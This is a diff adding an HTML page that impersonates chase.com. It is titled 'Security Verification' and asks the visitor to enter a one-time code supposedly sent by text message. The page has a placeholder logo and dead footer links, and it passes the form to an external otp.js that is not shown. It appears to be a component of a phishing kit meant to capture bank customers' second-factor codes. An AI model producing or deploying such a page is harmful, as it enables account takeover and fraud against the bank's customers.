@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - chase.com</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 50px;
+        }
+
+        .progress-bar {
+            background-color: #e9ecef;
+            border-radius: 5px;
+            overflow: hidden;
+            height: 6px;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar>div {
+            background-color: #0074cc;
+            width: 50%;
+            height: 100%;
+        }
+
+        h1 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-top: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0074cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056a3;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #0074cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #error {
+            display: none;
+            color: rgb(202, 8, 8);
+            margin-top: -1em;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://via.placeholder.com/50" alt="Logo">
+        </div>
+
+        <div class="progress-bar">
+            <div></div>
+        </div>
+
+        <h1>Let's confirm your identity.</h1>
+        <p>
+            To protect your account, please tell us the requested info so we can confirm your identity.
+            If you have more than one account, choose one and we’ll take care of the rest.
+        </p>
+
+        <div class="form-group">
+            <p><strong>We sent you a text message</strong></p>
+            <label for="otp">Please tell us one-time code (OTP)</label>
+            <input type="text" id="otp" placeholder="Enter your OTP">
+            <p id="error"></p>
+        </div>
+
+        <button id="otpBtn">Next</button>
+
+        <div class="footer">
+            <a href="#">Questions?</a> |
+            <a href="#">Read our FAQs</a>
+        </div>
+    </div>
+    <script src="otp.js"></script>
+</body>
+
+</html>
